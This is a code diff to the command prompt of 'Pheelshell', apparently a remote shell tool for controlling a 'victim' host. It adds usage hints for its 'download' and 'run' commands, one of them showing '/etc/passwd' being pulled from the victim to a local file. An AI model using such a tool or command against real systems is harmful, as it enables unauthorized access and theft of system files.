@@ -91,6 +91,9 @@ def prompt(pheelshell: Pheelshell=None):
             response_status = pheelshell.download(remote_path, local_path)
             print(response_status)
             continue
+        elif command.startswith('download'):
+            print('The paths must be enclosed in single quotes: \"download \'/etc/passwd\' \'passwd.txt\'\"')
+            continue
 
         # Handle generic command with 'action type #index'
         matches = re.search(r'(?P<action>.*) (?P<type>.*) (?P<index>[0-9]+)', command)
@@ -102,6 +105,9 @@ def prompt(pheelshell: Pheelshell=None):
                 output = pheelshell.execute_command(victim_command)
                 print(output)
                 continue
+            elif command.startswith('run'):
+                print('The command must be enclosed in single quotes: \"run \'ls\'\"')
+                continue
 
             if not matches:
                 # Handle generic command with 'action type'
@@ -112,7 +118,7 @@ def prompt(pheelshell: Pheelshell=None):
             continue
 
         action = matches.group('action')
-        if action not in ['run', 'use', 'show']:
+        if action not in ['use', 'show']:
             print(f'Unrecognized action in command: "{command}"')
             continue
 
@@ -127,10 +133,7 @@ def prompt(pheelshell: Pheelshell=None):
             continue
 
         if action and module_type:
-            if action == 'run':
-                print('The command must be enclosed in single quotes: \"run \'ls\'\"')
-                continue
-            elif action == 'show':
+            if action == 'show':
                 if module_index is not None:
                     if not pheelshell:
                         print('Must be connected to a victim in order to show playbook results.')
